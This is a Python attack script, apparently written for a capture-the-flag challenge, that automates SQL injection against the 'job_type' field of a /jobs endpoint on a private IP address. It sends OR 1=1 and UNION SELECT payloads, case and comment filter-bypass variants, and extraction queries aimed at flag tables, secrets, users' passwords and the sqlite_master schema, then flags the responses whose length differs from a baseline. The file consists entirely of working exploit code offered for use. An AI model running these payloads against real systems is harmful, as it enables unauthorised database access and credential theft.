import requests
import json
import sys

TARGET_URL = "http://10.0.162.113:80/jobs"
HEADERS = {"Content-Type": "application/json"}

def send_payload(session, payload_value):
    try:
        data = {"job_type": payload_value}
        resp = session.post(TARGET_URL, json=data, headers=HEADERS, timeout=10)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

def main():
    session = requests.Session()

    print("=" * 80)
    print("STEP 0: Baseline normal requests")
    print("=" * 80)
    for normal in ["back-end", "front-end"]:
        code, text = send_payload(session, normal)
        print(f"\n[BASELINE] job_type='{normal}' | Status: {code}")
        print(f"Response: {text[:500]}")
        print(f"Response length: {len(text)}")

    print("\n" + "=" * 80)
    print("STEP 1: Single keyword tests (find whitelisted words)")
    print("=" * 80)
    keywords = [
        "OR", "AND", "SELECT", "UNION", "FROM", "WHERE",
        "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
        "DATABASE", "FLAG", "LIKE", "or", "and", "select",
        "union", "from", "where", "flag"
    ]
    keyword_results = {}
    for kw in keywords:
        code, text = send_payload(session, kw)
        keyword_results[kw] = (code, text)
        print(f"\n[KEYWORD] job_type='{kw}' | Status: {code}")
        print(f"Response: {text[:500]}")
        print(f"Response length: {len(text)}")

    print("\n" + "=" * 80)
    print("STEP 2: SQL injection pattern tests")
    print("=" * 80)
    patterns = [
        "back-end' OR 1=1--",
        "back-end' OR '1'='1",
        "back-end' OR '1'='1'--",
        "back-end' OR '1'='1'#",
        "back-end' OR 1=1#",
        "back-end'/**/OR/**/1=1--",
        "back-end' UNION SELECT 1,2,3,4--",
        "back-end' UNION SELECT 1--",
        "back-end' UNION SELECT 1,2--",
        "back-end' UNION SELECT 1,2,3--",
        "back-end' UNION SELECT 1,2,3,4,5--",
        "back-end' UNION SELECT 1,2,3,4,5,6--",
        "back-end' UNION SELECT 1,2,3,4,5,6,7--",
        "back-end' UNION SELECT 1,2,3,4,5,6,7,8--",
        "back-end' UNION SELECT 1,2,3,4,5,6,7,8,9--",
        "back-end' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
        "' OR 1=1--",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1#",
        "1' OR '1'='1",
        "back-end' AND 1=1--",
        "back-end' AND '1'='1",
        "back-end' AND 1=1--",
    ]
    for pat in patterns:
        code, text = send_payload(session, pat)
        print(f"\n[PATTERN] job_type='{pat}' | Status: {code}")
        print(f"Response: {text[:500]}")
        print(f"Response length: {len(text)}")

    print("\n" + "=" * 80)
    print("STEP 3: Case variation and bypass tests")
    print("=" * 80)
    bypass_patterns = [
        "back-end' oR 1=1--",
        "back-end' Or 1=1--",
        "back-end' oR'1'='1",
        "back-end'/**/OR/**/1=1--",
        "back-end'%20OR%201=1--",
        "back-end'+OR+1=1--",
        "back-end' oR 1=1#",
        "back-end' Or 1=1#",
        "back-end' uniOn selEct 1,2,3,4--",
        "back-end' UniOn SeLect 1,2,3,4--",
        "back-end'UNION SELECT 1,2,3,4--",
        "back-end'UNION/**/SELECT/**/1,2,3,4--",
        "back-end' UNION ALL SELECT 1,2,3,4--",
        "back-end' UNION SELECT NULL,NULL,NULL,NULL--",
        "back-end' UNION SELECT 'a','b','c','d'--",
        "back-end' UNION SELECT sql,2,3,4 FROM sqlite_master--",
        "back-end' UNION SELECT table_name,2,3,4 FROM information_schema.tables--",
        "back-end' UNION SELECT group_concat(sql),2,3,4 FROM sqlite_master--",
    ]
    for pat in bypass_patterns:
        code, text = send_payload(session, pat)
        print(f"\n[BYPASS] job_type='{pat}' | Status: {code}")
        print(f"Response: {text[:500]}")
        print(f"Response length: {len(text)}")

    print("\n" + "=" * 80)
    print("STEP 4: FLAG-specific extraction attempts")
    print("=" * 80)
    flag_patterns = [
        "back-end' UNION SELECT FLAG,2,3,4 FROM FLAG--",
        "back-end' UNION SELECT flag,2,3,4 FROM flag--",
        "back-end' UNION SELECT * FROM flag--",
        "back-end' UNION SELECT * FROM FLAG--",
        "back-end' UNION SELECT flag,2,3,4 FROM flags--",
        "back-end' UNION SELECT FLAG,2,3,4 FROM flags--",
        "back-end' UNION SELECT secret,2,3,4 FROM secrets--",
        "back-end' UNION SELECT password,2,3,4 FROM users--",
        "back-end' UNION SELECT group_concat(flag),2,3,4 FROM flag--",
        "back-end' UNION SELECT group_concat(FLAG),2,3,4 FROM FLAG--",
        "' UNION SELECT FLAG,2,3,4 FROM FLAG--",
        "' UNION SELECT flag,2,3,4 FROM flag--",
        "back-end' UNION SELECT sql,2,3,4 FROM sqlite_master WHERE type='table'--",
        "back-end' UNION SELECT name,2,3,4 FROM sqlite_master WHERE type='table'--",
        "back-end' UNION SELECT group_concat(name),2,3,4 FROM sqlite_master WHERE type='table'--",
    ]
    for pat in flag_patterns:
        code, text = send_payload(session, pat)
        print(f"\n[FLAG_EXTRACT] job_type='{pat}' | Status: {code}")
        print(f"Response: {text[:500]}")
        print(f"Response length: {len(text)}")

    print("\n" + "=" * 80)
    print("STEP 5: Analysis - Compare response lengths")
    print("=" * 80)
    _, baseline_text = send_payload(session, "back-end")
    baseline_len = len(baseline_text)
    print(f"Baseline 'back-end' response length: {baseline_len}")

    all_tests = keywords + patterns + bypass_patterns + flag_patterns
    interesting = []
    for pat in all_tests:
        code, text = send_payload(session, pat)
        if code == 200 and len(text) != baseline_len:
            interesting.append((pat, len(text), text[:200]))

    if interesting:
        print("\nInteresting payloads (different response length than baseline):")
        for pat, length, preview in interesting:
            print(f"  '{pat}' -> Length: {length} (baseline: {baseline_len})")
            print(f"    Preview: {preview}")
    else:
        print("\nNo payloads produced different response lengths.")

    print("\n" + "=" * 80)
    print("DONE")
    print("=" * 80)

if __name__ == "__main__":
    main()